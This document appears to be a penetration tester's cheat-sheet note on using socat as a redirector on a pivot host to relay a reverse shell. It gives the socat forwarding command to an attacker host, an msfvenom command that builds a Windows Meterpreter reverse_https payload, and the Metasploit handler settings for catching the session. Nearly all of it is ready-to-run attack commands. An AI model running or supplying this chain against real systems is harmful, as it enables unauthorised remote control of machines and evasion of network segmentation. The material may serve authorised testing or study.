# Socat Redirection — Reverse Shell

Socat as a dumb pipe redirector on the pivot — no SSH needed, no Meterpreter required. Traffic hits pivot:8080 → forwards to your attack host:80.

Start socat on the pivot — `fork` keeps it alive for multiple connections:

```bash
socat TCP4-LISTEN:8080,fork TCP4:<ATTACK_HOST_IP>:80
```

Generate payload pointing at the pivot's internal IP and socat's listening port:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_INTERNAL_IP> LPORT=8080 -f exe -o <PAYLOAD>.exe
```

MSF listener on attack host — listens on the port socat is forwarding to:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

Flow: `Windows → pivot:8080 → socat → attack host:80 → MSF`

Session source will show the pivot's IP (not the Windows host) — expected.

> [!tip] Socat is simpler than SSH remote forwarding when you just need a dumb redirector and don't want to deal with SSH keys or creds on the pivot. If socat isn't installed: `apt install socat` or `yum install socat`.

> [!warning] `fork` is required — without it socat exits after the first connection. Always include it for reverse shell redirectors.